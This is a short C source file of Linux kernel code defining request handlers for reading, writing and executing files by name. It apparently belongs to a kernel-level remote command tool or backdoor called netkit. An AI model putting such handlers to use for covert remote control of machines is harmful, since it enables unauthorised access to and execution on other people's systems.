#include <linux/types.h>
#include <linux/errno.h>
#include <linux/string.h>

#include "file.h"

#include "../../netkit.h"
#include "../../sys/file.h"


int cmd_handle_file_read(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;

    filename_len = strnlen(req_buf, req_buflen);

    // require nullbyte
    if (filename_len == req_buflen || filename_len == 0)
        return -EINVAL;

    return file_read(req_buf, res_buf, res_buflen);
}

int cmd_handle_file_write(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;
    const u8 *content_buf;
    size_t content_buflen;

    filename_len = strnlen(req_buf, req_buflen);

    // require filename nullbyte
    if (filename_len == req_buflen || filename_len == 0)
        return -EINVAL;

    // allow content buflen of 0 with OOB start ptr
    content_buf = req_buf + filename_len + 1;
    content_buflen = req_buflen - filename_len - 1;
    
    return file_write(req_buf, content_buf, content_buflen);
}

int cmd_handle_file_exec(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;

    filename_len = strnlen(req_buf, req_buflen);

    // require nullbyte
    if (filename_len == req_buflen || filename_len == 0)
        return -EINVAL;

    return file_exec(req_buf, res_buf, res_buflen);
}